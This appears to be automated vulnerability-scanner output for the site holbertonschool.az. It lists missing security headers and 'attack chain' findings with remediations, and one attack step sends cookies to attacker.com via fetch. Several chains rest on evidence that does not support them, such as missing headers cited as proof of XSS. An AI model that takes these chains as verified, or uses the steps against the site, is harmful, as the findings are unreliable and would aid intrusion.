findings.detail: CSP prevents XSS and data injection attacks by controlling allowed resource sources.
findings.evidence: Header 'Content-Security-Policy' not present in response
findings.remediation: Add a strict CSP: 'default-src \'self\'; script-src \'self\'; object-src \'none\';'

findings.detail: HSTS forces HTTPS connections and prevents SSL-stripping attacks.
findings.evidence: Header 'Strict-Transport-Security' not present in response
findings.remediation: Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

findings.detail: Missing X-Frame-Options allows clickjacking attacks (embedding site in iframes).
findings.evidence: Header 'X-Frame-Options' not present in response
findings.remediation: Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive instead)

findings.detail: Missing header allows MIME-type sniffing, enabling content injection.
findings.evidence: Header 'X-Content-Type-Options' not present in response
findings.remediation: Add: X-Content-Type-Options: nosniff

findings.detail: Missing Referrer-Policy may leak sensitive URL information to third parties.
findings.evidence: Header 'Referrer-Policy' not present in response
findings.remediation: Add: Referrer-Policy: strict-origin-when-cross-origin

findings.detail: Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).
findings.evidence: Header 'Permissions-Policy' not present in response
findings.remediation: Add: Permissions-Policy: geolocation=(), camera=(), microphone=()

findings.detail: Missing COOP allows cross-origin pages to access window references.
findings.evidence: Header 'Cross-Origin-Opener-Policy' not present in response
findings.remediation: Add: Cross-Origin-Opener-Policy: same-origin

findings.detail: Missing CORP allows cross-origin pages to load this site's resources.
findings.evidence: Header 'Cross-Origin-Resource-Policy' not present in response
findings.remediation: Add: Cross-Origin-Resource-Policy: same-origin

Step 2: [?] at https://holbertonschool.az/api-docs/
findings.remediation: Move config files outside web root. Use secrets managers (Vault, AWS SSM). Restrict file path inputs — whitelist allowed files.
findings.attack_steps: LFI → /app/.env → DB_PASSWORD → Database Access → Full Data Breach

findings.type: CHAIN: CORS Misconfiguration → XSS → Session Theft
findings.detail: Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.
findings.evidence:
Step 1: [Missing Header: Cross-Origin-Opener-Policy] at https://holbertonschool.az
Step 2: [Missing Header: Content-Security-Policy] at https://holbertonschool.az
findings.remediation: Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.
findings.attack_steps: CORS * → XSS on trusted subdomain → fetch(attacker.com, cookies) → Session Steal

findings.type: CHAIN: Open Redirect → Phishing → OAuth Token Steal
findings.detail: An open redirect on the login page can be used to redirect OAuth authorization codes to an attacker-controlled server. The victim's session tokens are silently stolen.
findings.evidence:
Step 1: [CVE: CVE-2020-15242] at ?
Step 2: [Unauthenticated Admin Access] at https://holbertonschool.az/admin/
findings.remediation: Whitelist all redirect URLs. Never use user-supplied URLs in redirect_uri without strict validation. Implement state parameter in OAuth flows.
findings.attack_steps: Open Redirect → Craft malicious login URL → Victim clicks → OAuth code stolen

findings.type: CHAIN: IDOR → PII Exfiltration → Mass Account Hijack
findings.detail: Insecure Direct Object References allow attackers to enumerate user IDs and access other users' data (emails, addresses, payment info). At scale, this enables mass PII exfiltration and account takeover.
findings.evidence:
Step 1: [Unauthenticated Admin Access] at https://holbertonschool.az/admin/
Step 2: [Secret Leakage in JS — Password] at https://analytics.tiktok.com/i18n/pixel/static/main.MWJkOTJmOWRkOQ.js
findings.remediation: Implement authorization checks on every resource access. Use UUID instead of sequential IDs. Log and alert on anomalous data access patterns.
findings.attack_steps: IDOR /api/user/1 → iterate IDs → dump all emails → credential stuffing → mass takeover

findings.remediation: Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.
findings.attack_steps: JWT alg:none → Forge {role:admin} → Access admin panel → Full privilege escalation
